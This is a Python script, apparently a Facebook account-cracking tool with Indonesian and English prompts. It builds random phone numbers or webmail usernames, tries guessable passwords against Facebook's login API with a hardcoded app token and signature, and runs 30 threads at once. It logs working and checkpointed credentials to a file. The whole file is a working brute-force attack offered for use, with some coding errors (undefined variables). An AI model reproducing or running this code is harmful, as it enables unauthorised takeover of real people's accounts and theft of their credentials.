# -*- coding=utf-8 -*-

import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        oks = open("out/email.txt", "a")
        oks.write(user + "|" + pw + "\n")
        oks.close()
        oks.append(user + pw)
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        cek = open("out/email.txt", "a")
        cek.write(user + "|" + pw + "\n")
        cek.close()
        cekpoint.append(user + pw)
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  IsiFill in the starting number, bro, without the number 0

  5 digits should not be less and should not be more.
  .
  Contoh: 86382
  ''')
  kode=str(input('  Enter the starting number: '))
  exit('  Number must be 5 digits so it can't be less .') if len(code) < 5 else ''
  exit('  Number must b 5 digits it can't be more ih.') if len(code) > 5 else ''
  jml=int(input('''
  the number of numbers that will be made an example: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Semoga hari ini Anda beruntung :)
  Tunggu ya bro jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK WITHOUT LOGIN | CRACKER RANDOM EMAIL ]

  Isi nama penggunanya ya bro
  Contoh: putri
  ''')
  nama=input('  Nama pengguna: ')
  domain=input('''
  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
  pilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon isi yang bener ya bro.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  the number of numbers that will be made an example: 10
  Jumlah: '''))
  setpw=input('''yg
  Set password approximate user name
  contoh: putri123,putri1234
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
  Semoga hari ini anda beruntung :)
  Tunggu ya bro jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai bro')

def pilih():
  print('''
  _             
  /\  /\__ _  ___| | _____ _ __ 
 / /_/ / _` |/ __| |/ / _ \ '__|
/ __  / (_| | (__|   <  __/ |   
\/ /_/ \__,_|\___|_|\_\___|_|
  1. Crack forme Num random
  2. crack firme email random
  ''')
  pil=int(input('  Pilih mana bro ?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf ada yang error bro , silahkan coba lagi yahh.')
